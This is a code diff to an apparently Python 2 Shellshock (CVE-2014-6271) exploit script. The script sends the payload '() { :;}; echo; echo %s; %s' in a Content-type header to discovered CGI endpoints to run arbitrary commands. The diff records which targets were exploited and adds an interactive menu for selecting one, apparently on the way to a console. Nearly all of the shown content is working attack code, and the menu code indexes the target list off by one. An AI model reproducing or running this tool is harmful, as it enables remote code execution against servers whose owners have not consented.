@@ -155,6 +155,8 @@ def exploit_cgi(proxy, target_list, exploit, verbose):
     attack_strings = {
        "Content-type": "() { :;}; echo; echo %s; %s" % (success_flag, exploit)
        }
+    # A list of apparently successfully exploited targets returned to main() 
+    successful_targets = []
 
     if len(target_list) > 1:
         print "[+] %i potential targets found" % len(target_list)
@@ -187,13 +189,35 @@ def exploit_cgi(proxy, target_list, exploit, verbose):
                         if line.strip() != success_flag: 
                             print "  %s" % line.strip()
                     buf.close()
+                    successful_targets.append(target)
                 else:
                     print "[-] Not vulnerable" 
             except Exception as e:
                 if verbose: print "[I] Exception - %s - %s" % (target, e) 
             finally:
                 pass
+    return successful_targets
 
+
+def ask_for_console(successful_targets):
+    # Initialise to non zero to enter while loop
+    user_input = 1
+    
+    print "[+] The following URLs appeared to be exploitable:"
+    for x in range(len(successful_targets)):
+        print "[%i] %s" % (x, successful_targets[x-1])
+    while user_input:
+        user_input = raw_input("[?] Enter an URL number or 0 to exit: ")
+        try:
+            user_input = int(user_input)
+        except:
+            continue
+        if user_input not in range(len(successful_targets)+1):
+            print "[-] Please enter a number between 0 and %i" % len(successful_targets)
+            continue
+        elif not user_input:
+            continue
+        print "[+] Alrighty then..."
 
 def validate_address(hostaddress):
     """ Attempt to identify if proposed host address is invalid by matching
@@ -363,8 +387,10 @@ def main():
     target_list = scan_hosts(protocol, confirmed_hosts, port, cgi_list, proxy, verbose)
 
     # If any cgi scripts were found on the target host try to exploit them
-    if len(target_list) > 0:
-        exploit_cgi(proxy, target_list, exploit, verbose)
+    if len(target_list):
+        successful_targets = exploit_cgi(proxy, target_list, exploit, verbose)
+        if len(successful_targets):
+            ask_for_console(successful_targets)
     else:
         print "[+] No potential targets found :("
     print "[+] The end"
